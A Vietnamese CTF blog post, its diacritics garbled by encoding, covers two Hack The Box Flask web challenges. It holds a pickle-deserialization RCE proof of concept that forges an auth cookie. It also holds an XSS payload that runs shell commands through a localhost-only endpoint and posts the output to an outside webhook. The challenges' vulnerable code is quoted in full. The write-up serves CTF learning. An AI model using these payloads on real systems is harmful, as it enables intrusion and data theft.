<p><img src="https://hackmd.io/_uploads/rJEHTWdLC.png" alt="image"></p>
<p>flag: <code>HTB{t3mpl14t35_c4us3_p41n_4nd_f1l35_1nclud3s!}</code></p>
<h2 id="spellbound-servants">Spellbound Servants</h2>
<ul>
<li>T∆∞∆°ng t·ª± nh∆∞ c√°c chall python tr∆∞·ªõc th√¨ chall n√†y c≈©ng c√≥ 2 route ch√≠nh:</li>
</ul>
<pre><code>from flask import Flask
from application.blueprints.routes import web, api
from application.database import mysql
from application.util import response

app = Flask(__name__)
app.config.from_object('application.config.Config')

mysql.init_app(app)

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
    response = {
        'error': {
            'type': error.__class__.__name__,
            'message': message
        }
    }

    return response, error.code if hasattr(error, 'code') else 500
</code></pre><ul>
<li>ƒê√≥ l√† / v√† /api -&gt; c√πng quan s√°t logic code -&gt;</li>
</ul>
<pre><code>from application.database import *
from flask import Blueprint, redirect, render_template, request, make_response
from application.util import response, isAuthenticated

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/', methods=['GET', 'POST'])
def loginView():
    return render_template('login.html')

@web.route('/register', methods=['GET', 'POST'])
def registerView():
    return render_template('register.html')

@web.route('/home', methods=['GET', 'POST'])
@isAuthenticated
def homeView(user):
    return render_template('index.html', user=user)

@api.route('/login', methods=['POST'])
def api_login():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login_user_db(username, password)
    
    if user:
        res = make_response(response('Logged In sucessfully'))
        res.set_cookie('auth', user)
        return res
        
    return response('Invalid credentials!'), 403

@api.route('/register', methods=['POST'])
def api_register():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = register_user_db(username, password)
    
    if user:
        return response('User registered! Please login'), 200
        
    return response('User already exists!'), 403

</code></pre><ul>
<li>
<p>C√≥ th·ªÉ th·∫•y ch∆∞∆°ng tr√¨nh c√≥ c√°c ch·ª©c nƒÉng ƒë√≥ l√† reg,login, /, /home:</p>
</li>
<li>
<p>Sau khi ti·∫øn h√†nh ƒëƒÉng k√≠ v·ªõi username v√† password -&gt; ti·∫øn h√†nh l∆∞u user v√†o trong db:</p>
</li>
</ul>
<pre><code>def register_user_db(username, password):
    check_user = query('SELECT username FROM users WHERE username = %s', (username,), one=True)

    if not check_user:
        query('INSERT INTO users(username, password) VALUES(%s, %s)', (username, password,))
        mysql.connection.commit()
        
        return True
    
    return False
</code></pre><ul>
<li>Ti·∫øp theo login -&gt; server c≈©ng nh·∫≠n username v√† password t·ª´ ng∆∞·ªùi d√πng -&gt;</li>
</ul>
<pre><code>def login_user_db(username, password):
    user = query('SELECT username FROM users WHERE username = %s AND password = %s', (username, password,), one=True)
    
    if user:
        pickled_data = base64.b64encode(pickle.dumps(user))
        return pickled_data.decode(&quot;ascii&quot;) 
    else:
        return False
</code></pre><ul>
<li>
<p>T√¨m c√°c b·∫£n ghi c·ªßa username v·ªõi username v√† password sau ƒë√≥ g·ªçi <code>base64.b64encode(pickle.dumps</code> v√† tr·∫£ ra <code>pickled_data.decode(&quot;ascii&quot;)</code></p>
</li>
<li>
<p>Th√¨ c√≥ v·∫ª vul ·ªü ƒë√¢y nh∆∞ ta ƒë√£ bi·∫øt th√¨ pickle m√† ta control ƒë∆∞·ª£c th√¨ c√≥ th·ªÉ d·∫´n ƒë·∫øn RCE ·ªü python.</p>
</li>
<li>
<p>N·∫øu ƒëƒÉng nh·∫≠p th√†nh c√¥ng l∆∞u v√†o cookie v·ªõi <code>auth</code></p>
</li>
<li>
<p>ƒê√≥ ch∆∞a ph·∫£i l√† ch·ªó g√¢y ra l·ªó h·ªïng vul n·∫±m ·ªü middleware ƒë·ªÉ check authentication cho ng∆∞·ªùi d√πng.</p>
</li>
</ul>
<pre><code>
def isAuthenticated(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        token = request.cookies.get('auth', False)

        if not token:
            return abort(401, 'Unauthorised access detected!')
        
        try:
            user = pickle.loads(base64.urlsafe_b64decode(token))
            kwargs['user'] = user
            return f(*args, **kwargs)
        except:
            return abort(401, 'Unauthorised access detected!')

    return decorator
</code></pre><ul>
<li>
<p>nh∆∞ ta th·∫•y th√¨ server nh·∫≠n <code>auth</code> t·ª´ cookie sau ƒë√≥ g·ªçi <code>pickle.loads(base64.urlsafe_b64decode(token))</code> v√† g·∫Øn gi√° tr·ªã cho c√°c session c·ªßa user.</p>
</li>
<li>
<p>V·∫≠y th√¨ vul ·ªü ƒë√¢y</p>
</li>
</ul>
<h3 id="flow-2">Flow</h3>
<ul>
<li>
<p>Register -&gt; login -&gt; quan s√°t qu√° tr√¨nh ho·∫°t ƒë·ªông n·∫øu b·∫°n l√† beginer.</p>
</li>
<li>
<p>N·∫øu hi·ªÉu r√µ r·ªìi th√¨ ch·ªâ c·∫ßn gen payload rce -&gt; base64-en -&gt; g·∫Øn v√†o cookie auth -&gt; /home v√† nh·∫≠n flag.</p>
</li>
<li>
<p>Xem v·ªã tr√≠ c·ªßa flag n·∫±m ·ªü /flag.txt</p>
</li>
</ul>
<pre><code>FROM python:3.11-alpine

# Install packages
RUN apk update \
    &amp;&amp; apk add --no-cache --update mariadb mariadb-dev mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev

# Upgrade pip
RUN python -m pip install --upgrade pip

# Copy flag
COPY flag.txt /flag.txt

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Install dependencies
RUN pip install --no-cache-dir -r requirements.txt

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# create database and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT [&quot;/entrypoint.sh&quot;]
</code></pre><h3 id="exploit-1">Exploit</h3>
<ul>
<li>vul pickle serial to RCE</li>
</ul>
<p><img src="https://hackmd.io/_uploads/ByJEotqIA.png" alt="image"></p>
<p>poc:</p>
<pre><code>import pickle, base64

class test:
    def __reduce__(self):
        p=&quot;open('/flag.txt').read()&quot;
        return (eval,(p,))

rs={'username':test()}

print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))

</code></pre><p>flag: <code>HTB{sp3l1_0f_the_p1ckl3!}</code></p>
<h2 id="pumpkinspice">PumpkinSpice</h2>
<ul>
<li>M·ªôt chall v·ªõi source code python_flask:</li>
</ul>
<pre><code>
import string, time, subprocess
from flask import Flask, request, render_template, abort
from threading import Thread

app = Flask(__name__)

addresses = []

def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait

    host, port = &quot;localhost&quot;, 1337
    HOST = f&quot;http://{host}:{port}&quot;

    options = Options()

    options.add_argument(&quot;--headless&quot;)
    options.add_argument(&quot;--no-sandbox&quot;)
    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
    options.add_argument(&quot;--disable-infobars&quot;)
    options.add_argument(&quot;--disable-background-networking&quot;)
    options.add_argument(&quot;--disable-default-apps&quot;)
    options.add_argument(&quot;--disable-extensions&quot;)
    options.add_argument(&quot;--disable-gpu&quot;)
    options.add_argument(&quot;--disable-sync&quot;)
    options.add_argument(&quot;--disable-translate&quot;)
    options.add_argument(&quot;--hide-scrollbars&quot;)
    options.add_argument(&quot;--metrics-recording-only&quot;)
    options.add_argument(&quot;--mute-audio&quot;)
    options.add_argument(&quot;--no-first-run&quot;)
    options.add_argument(&quot;--dns-prefetch-disable&quot;)
    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
    options.add_argument(&quot;--media-cache-size=1&quot;)
    options.add_argument(&quot;--disk-cache-size=1&quot;)
    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)

    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f&quot;{HOST}/addresses&quot;)
    time.sleep(5)
    browser.quit()


@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
def index():
    return render_template(&quot;index.html&quot;)


@app.route(&quot;/addresses&quot;, methods=[&quot;GET&quot;])
def all_addresses():
    remote_address = request.remote_addr
    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)

    return render_template(&quot;addresses.html&quot;, addresses=addresses)


@app.route(&quot;/add/address&quot;, methods=[&quot;POST&quot;])
def add_address():
    address = request.form.get(&quot;address&quot;)
    
    if not address:
        return render_template(&quot;index.html&quot;, message=&quot;No address provided&quot;)

    addresses.append(address)
    Thread(target=start_bot,).start()
    return render_template(&quot;index.html&quot;, message=&quot;Address registered&quot;)


@app.route(&quot;/api/stats&quot;, methods=[&quot;GET&quot;])
def stats():
    remote_address = request.remote_addr
    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)

    command = request.args.get(&quot;command&quot;)
    if not command:
        return render_template(&quot;index.html&quot;, message=&quot;No command provided&quot;)

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results


if __name__ == &quot;__main__&quot;:
    app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False)

</code></pre><ul>
<li>ƒê·∫ßu ti√™n ch√∫ng ta s·∫Ω quan s√°t v·ªã tr√≠ c·ªßa flag n·∫±m ·ªü <code>/flag.txt</code>:</li>
</ul>
<pre><code>FROM python:3.11-alpine

# Setup usr
RUN adduser -D -u 1000 -g 1000 -s /bin/sh www

# Install dependencies
RUN apk add --update --no-cache gcc g++ make openssl-dev

# Install packages
RUN apk add --update --no-cache supervisor chromium chromium-chromedriver

# Copy flag
COPY flag.txt /flag.txt

# Upgrade pip
RUN python -m pip install --upgrade pip

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Install dependencies
RUN pip install -r requirements.txt

# Copy configs
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Copy entrypoint
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT [&quot;/entrypoint.sh&quot;]
</code></pre><ul>
<li>
<p>T·ª´ v·ªã tr√≠ c·ªßa n√≥ ta c√≥ th·ªÉ th·∫•y l√† v·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† RCE ƒë·ªÉ nh·∫≠n ƒë∆∞·ª£c flag n·∫±m ·ªü root -&gt; b·∫Øt ƒë·∫ßu ƒëi t√¨m hook t·∫°i app.py.</p>
</li>
<li>
<p>Ta c√≥ th·ªÉ th·∫•y ngay ·ªü ƒë√¢y l√† api <code>/api/stats</code>:</p>
</li>
</ul>
<pre><code>@app.route(&quot;/api/stats&quot;, methods=[&quot;GET&quot;])
def stats():
    remote_address = request.remote_addr
    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)

    command = request.args.get(&quot;command&quot;)
    if not command:
        return render_template(&quot;index.html&quot;, message=&quot;No command provided&quot;)

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results
</code></pre><ul>
<li>·ªü ƒë√¢y s·∫Ω c√≥ m·ªôt <code>subprocess</code> ƒë∆∞·ª£c g·ªçi ƒë·ªÉ ch·∫°y command ƒë∆∞·ª£c truy·ªÅn v√†o v·ªõi method GET.</li>
<li>Quan s√°t nhanh th√¨ y√™u c·∫ßu localhost v√† nh·∫≠n param command -&gt; ch·∫°y command n√†y v√† tr·∫£ ra k·∫øt qu·∫£ -&gt; v·∫•n ƒë·ªÅ l√† bypass ƒë∆∞·ª£c localhost.</li>
<li>C√πng ƒë·ªÉ √Ω server c√≥ m·ªôt m·∫£ng <code>addresses = []</code> ƒë·ªÉ l∆∞u tr·ªØ l·∫°i c√°c ƒë·ªãa ch·ªâ v√† hi·ªÉn th·ªã ra template `<!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>M√¨nh c√≥ 2 √Ω t∆∞·ªüng ·ªü ƒë√¢y ƒë√≥ l√† SSTI ho·∫∑c XSS nh∆∞ng h√£y ƒë·ªÉ √Ω ƒë·∫øn logic code b√¨nh th∆∞·ªùng c·ªßa n√≥ ·ªü ƒë√¢y.</p>
</li>
<li>
<p>Ta th·∫•y ƒë√¢y l√† n∆°i kh·∫£ nghi m√† ta c√≥ th·ªÉ truy c·∫≠p m√† kh√¥ng c·∫ßn localhost:</p>
</li>
</ul>
<pre><code>
@app.route(&quot;/add/address&quot;, methods=[&quot;POST&quot;])
def add_address():
    address = request.form.get(&quot;address&quot;)
    
    if not address:
        return render_template(&quot;index.html&quot;, message=&quot;No address provided&quot;)

    addresses.append(address)
    Thread(target=start_bot,).start()
    return render_template(&quot;index.html&quot;, message=&quot;Address registered&quot;)
</code></pre><ul>
<li>method POST nh·∫≠n address sau ƒë√≥ push address v√†o trong m·∫£ng ·ªü tr√™n -&gt; t·∫°o m·ªôt thread v√† start v·ªõi h√†m start bot</li>
<li>C√πng quan s√°t h√†m start_bot():</li>
</ul>
<pre><code>def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait

    host, port = &quot;localhost&quot;, 1337
    HOST = f&quot;http://{host}:{port}&quot;

    options = Options()

    options.add_argument(&quot;--headless&quot;)
    options.add_argument(&quot;--no-sandbox&quot;)
    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
    options.add_argument(&quot;--disable-infobars&quot;)
    options.add_argument(&quot;--disable-background-networking&quot;)
    options.add_argument(&quot;--disable-default-apps&quot;)
    options.add_argument(&quot;--disable-extensions&quot;)
    options.add_argument(&quot;--disable-gpu&quot;)
    options.add_argument(&quot;--disable-sync&quot;)
    options.add_argument(&quot;--disable-translate&quot;)
    options.add_argument(&quot;--hide-scrollbars&quot;)
    options.add_argument(&quot;--metrics-recording-only&quot;)
    options.add_argument(&quot;--mute-audio&quot;)
    options.add_argument(&quot;--no-first-run&quot;)
    options.add_argument(&quot;--dns-prefetch-disable&quot;)
    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
    options.add_argument(&quot;--media-cache-size=1&quot;)
    options.add_argument(&quot;--disk-cache-size=1&quot;)
    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)

    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f&quot;{HOST}/addresses&quot;)
    time.sleep(5)
    browser.quit()
</code></pre><ul>
<li>S·ª≠ d·ª•ng <code>selenium</code> truy c·∫≠p v√†o <code>browser.get(f&quot;{HOST}/addresses&quot;)</code> b·∫±ng vi·ªác m·ªü chrome.</li>
<li>ƒê√¢y l√† api /addresses:</li>
</ul>
<pre><code>@app.route(&quot;/addresses&quot;, methods=[&quot;GET&quot;])
def all_addresses():
    remote_address = request.remote_addr
    if remote_address != &quot;127.0.0.1&quot; and remote_address != &quot;::1&quot;:
        return render_template(&quot;index.html&quot;, message=&quot;Only localhost allowed&quot;)

    return render_template(&quot;addresses.html&quot;, addresses=addresses)
</code></pre><ul>
<li>Check localhost v√† ƒë∆∞∆°ng nhi√™n l√† qua -&gt; render teamplate <code>addresses.html</code> v·ªõi m·∫£ng <code>return render_template(&quot;addresses.html&quot;, addresses=addresses)</code></li>
</ul>
<h3 id="flow-3">Flow</h3>
<ul>
<li>H∆∞·ªõng s·∫Ω l√† xss ƒë·ªÉ get ƒë·∫øn <code>/api/stats</code> sau ƒë√≥ ch·∫°y command <code>cat /flag.txt</code> sau ƒë√≥ tr·∫£ ra k·∫øt qu·∫£ ·ªü b√™n ngo√†i.</li>
</ul>
<h3 id="exploit-2">Exploit</h3>
<p>POC:</p>
<pre><code>fetch('http://localhost:1337/api/stats?command=ls+/')
  .then((response) =&gt; response.text())
  .then((data) =&gt; {
    // Convert the data to base64
    const base64Data = btoa(data);

    // Send the base64-encoded data to your server using a POST request
    fetch('https://webhook.site/14c97bf2-8cd5-4527-8f54-856f5729b95c', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain', // Set the appropriate content type for base64 data
      },
      body: base64Data, // Send the base64-encoded data as the request body
    })
    .then((response) =&gt; {
      if (response.ok) {
        console.log('Response data sent to your server successfully.');
      } else {
        console.error('Failed to send data to your server. Status:', response.status);
      }
    })
    .catch((error) =&gt; {
      console.error('Error:', error);
    });
  })
  .catch((error) =&gt; {
    console.error('Error fetching data from localhost:', error);
  });

</code></pre><p><img src="https://hackmd.io/_uploads/BJ8tSq5IA.png" alt="image">
<img src="https://hackmd.io/_uploads/rJ32rc5IR.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H16Trqq8C.png" alt="image"></p>
<ul>
<li>Flag n·∫±m ·ªü <code>/flage7c47cd9fa.txt</code></li>
</ul>
<p><img src="https://hackmd.io/_uploads/BkxGU9cIC.png" alt="image"></p>
<p>flag : <code>HTB{th3_m1s5i0n_f0r_4_fre3_tr34t}</code></p>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/write-up/2024-08-21-hackthebox-web-challpart2/" data-toggle="tooltip" data-placement="top" title="Htb web chall ctf 2024 - solved challenges - part 2">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/write-up/2024-05-18-htbbusinessctf2024/" data-toggle="tooltip" data-placement="top" title="Htb business ctf 2024 the vault of hope - solved challenges in time">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

